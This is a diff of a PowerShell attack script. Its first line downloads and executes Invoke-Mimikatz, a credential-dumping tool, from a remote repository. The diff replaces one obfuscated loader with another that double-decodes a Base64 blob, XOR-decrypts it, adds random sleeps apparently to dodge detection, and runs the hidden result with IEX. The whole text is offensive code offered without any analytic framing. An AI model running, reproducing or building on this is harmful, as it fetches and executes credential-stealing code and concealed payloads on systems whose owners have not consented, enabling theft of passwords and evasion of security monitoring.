@@ -1,16 +1,20 @@
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1')
 
-
-
-$VaCkljMhpY = "OwAmABsAagB/ADwABgA0AGcAGAAQAAkAJgApACMAUgAtACYAPgB5ACUABgAhAAkAOwAbAAYALQA+AH4AXAAnACwAPQA5AB4ADAAiAC4ABAAGABEAKgAkADAAWgBEACsAPgAjAAIAEAB5AGUAeAAAAAIANABkADAAGwAXACsAPwA1AAcAEAAmADgANAAdAA0ANwAvADkABgBNACAAJQA6AF0AMwAsAD0AMgAAABAAKwAvADsAHgAuACIALAA+ABMATAATACUAIAAXABEAMAA6ADsAHQAKADcAZQAlABcABQAwAGUAPwAXAAIAJwA5AHgAHwACADAAPgAyAAAATAAGADIAMQAbAA8ANwA4ADYABgAKACwAJAB4ADsADQA1ACUAPAAXAE4ADgAjADoAGwAIACIAPgAtAFwAEwAwAHsAcABbAA=="
-    $YumAlqDovT = "rcCJW"
-    function kneZCpRFUR($d, $k) {
+    function fjwIvUtVYAHIdrz($x, $y) {
         $r = ""
-        for ($i = 0; $i -lt $d.Length; $i++) {
-            $r += [char]($d[$i] -bxor [byte][char]$k[$i % $k.Length])
+        for ($i = 0; $i -lt $x.Length; $i++) {
+            $r += [char]($x[$i] -bxor [byte][char]$y[$i % $y.Length])
         }
         return $r
     }
-    $ltztfoezhO = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($VaCkljMhpY))
-    $decoded_code = kneZCpRFUR $ltztfoezhO $YumAlqDovT
-    iex $decoded_code
+    
+    $VNKHiAIntYuccYF = "Q3dBc0FCa0FZUUJRQUFZQU1RQVdBRzhBSmdBakFDc0FIUUFyQUNBQVFRQU1BQXdBTlFCdkFDOEFMUUEyQUNJQUxnQUFBQ1FBTHdBTUFHRUFlZ0FsQUMwQUhnQXZBQzBBRndBcEFEQUFNZ0EyQUJzQUtBQXZBQjhBWUFCekFBa0FOZ0FkQURFQU1nQkNBR2NBZXdBVEFDTUFIZ0J2QUNZQUVRQThBRHdBRkFBZ0FCd0FNZ0FrQUFvQUt3QTdBQThBTmdBTUFDOEFOUUJXQUNzQU93QU1BRzBBT1FBdUFEWUFIUUE2QUNjQUNRQW5BQVVBTFFBTUFCa0FMZ0E5QUFBQWJRQTVBQzRBTmdBZEFEb0FKd0FSQUM0QUJnQW9BRFVBVndBNkFERUFCd0F4QUVZQUtRQWtBQmtBTEFBbkFFNEFMd0FJQURJQU5RQWRBRG9BZXdBa0FEb0FEd0FvQUMwQURBQTZBRFVBRlFBckFBWUFMd0J1QURFQUpnQWlBQTRBS1FBTUFHd0FEQUFSQUNVQVBRQUtBQ01BSFFBN0FHOEFDQUE3QUdVQVJnQnJBQT09"
+    $FwQrRcyhkgHAZqa = "BiAAxHTa"
+    $zxZtuVAhzabKnYV = New-Object System.Text.StringBuilder
+    $IzFLCkZNorVggKT = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($VNKHiAIntYuccYF))))
+    
+    $lEAWYgAlUAlCKNP = fjwIvUtVYAHIdrz $IzFLCkZNorVggKT $FwQrRcyhkgHAZqa
+
+    $JIsaztbRFZQiSty = 1,2,3 | ForEach-Object { $_; Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500) }
+
+    IEX ($lEAWYgAlUAlCKNP)
